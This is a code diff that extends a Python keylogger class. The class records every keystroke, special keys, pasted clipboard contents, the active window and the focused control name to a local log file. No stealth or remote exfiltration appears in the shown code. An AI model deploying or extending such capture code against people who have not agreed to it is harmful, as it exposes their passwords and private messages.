@@ -3,7 +3,7 @@ from my_logging import Logger
 from util import get_active_window, get_save_info
 import pyperclip
 import uiautomation as auto
-
+from util import log
 
 class KeyLogger:
     def __init__(self, filename: str = "log.txt"):
@@ -12,12 +12,14 @@ class KeyLogger:
         self.logger = Logger(filename = filename)
 
         self.char_keys = None
+        self.other_keys = None
+
         self.prev_control = self.get_control()
         self.previous_win_info = get_active_window()
         
     def get_control(self):
         control = auto.GetFocusedControl()
-        return {"class" : control.ClassName,  "name" : control.Name if "Shift+Alt+F1" not in control.Name else ""}
+        return control.Name if "Alt+" not in control.Name else None
 
     # --- Keyboard functions ---
     def _on_press(self, key, injected = False):
@@ -25,20 +27,35 @@ class KeyLogger:
         control = self.get_control()
 
         try:
-            print(f"Keyboard: Key pressed -> {key.char}")
+            log(f"Keyboard: Key pressed -> {key.char}")
+            key = str(key.char)
             
-
-            if key.char == "\x16":
-                print(f"Paste command : {pyperclip.paste()}")
+            if key == "\x16":
+                log(f"Paste command : {pyperclip.paste()}")
                 self.write(pyperclip.paste(), win_info=win_info, control=control)
                 self.char_keys = None
                 self.previous_win_info = win_info
                 self.prev_control = control
+                self.other_keys = None
                 return
             
+            if "\\x" in repr(key):
+                print(f"Special key is pressed.........")
+                key = "SpecialKey : " + repr(key)
+                if self.other_keys:
+                    self.write(key, win_info=win_info, control=control, overwrite=True)
+                else:
+                    self.write(key, win_info=win_info, control=control)
+            
+                self.previous_win_info = win_info
+                self.prev_control = control
+                self.other_keys = None
+                return
+            
+            self.other_keys = None
 
             if self.previous_win_info != win_info or not self.char_keys or self.prev_control != control:
-                self.char_keys =  key.char
+                self.char_keys =  key
                 self.write(self.char_keys, win_info=win_info, control=control)
                 self.previous_win_info = win_info
                 self.prev_control = control
@@ -46,31 +63,49 @@ class KeyLogger:
             
             
 
-            self.char_keys += key.char
+            self.char_keys += key
             self.write(self.char_keys, win_info=win_info, control=control, overwrite=True)
             self.prev_control = control
             self.previous_win_info = win_info
 
             
         except AttributeError:
-            print(f"Keyboard: Special key pressed -> {key}")
+            log(f"Keyboard: Special key pressed -> {key}")
             if key == keyboard.Key.space:
-                if self.previous_win_info == win_info and self.char_keys:
+                if self.previous_win_info == win_info and self.char_keys and self.prev_control == control:
                     self.char_keys += " "
                     self.write(self.char_keys, win_info=win_info, control=control, overwrite=True)
+                    self.other_keys = None
                     return
                 
             if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
+                self.other_keys = None
                 return
             
             if key == keyboard.Key.backspace:
 
-                if self.previous_win_info == win_info and self.char_keys:
+                if self.previous_win_info == win_info and self.char_keys and self.prev_control == control:
                     self.char_keys = self.char_keys[:-1]
                     self.write(self.char_keys, win_info=win_info, control=control, overwrite=True)
+                    self.other_keys = None
                     return
 
             self.char_keys = None
+
+            if self.previous_win_info != win_info or  not self.other_keys:
+                self.other_keys = str(key)
+                self.write(self.other_keys, win_info=win_info, control=control)
+                self.prev_control = control
+                self.previous_win_info = win_info
+                return
+
+            self.other_keys = self.other_keys + " | " + str(key)
+            self.write(message=self.other_keys, win_info=win_info, control=control, overwrite=True)
+            self.prev_control = control
+            self.previous_win_info = win_info
+
+        except Exception as e:
+            log(f"Error [_on_press] : {e}")
 
             
     def _on_release(self, key, injected = False):
@@ -80,18 +115,19 @@ class KeyLogger:
         # except AttributeError:
         #     self._current_keys.discard(key)
 
-        print(f"Keyboard: Key released -> {key}")
+        log(f"Keyboard: Key released -> {key}")
         if key == keyboard.Key.esc:
             return False  # stop listener
        
+  
         
     def write(self, message, win_info: dict = None, control: dict = None, overwrite = False):
-        print(f"contol : {control}")
-        control_txt = ''
-        if control['name']:
-            control_txt = f"[name : {control['name']}]"
-        
-        self.logger.write(f"{get_save_info(win_info=win_info)} {control_txt} {message}", overwrite = overwrite)
+        log(f"contol : {control}")
+        if control:
+            control = f"[name : {control}]"
+        else:
+            control = ""
+        self.logger.write(f"{get_save_info(win_info=win_info)} {control} {message}", overwrite = overwrite)
         
 
     def run(self):
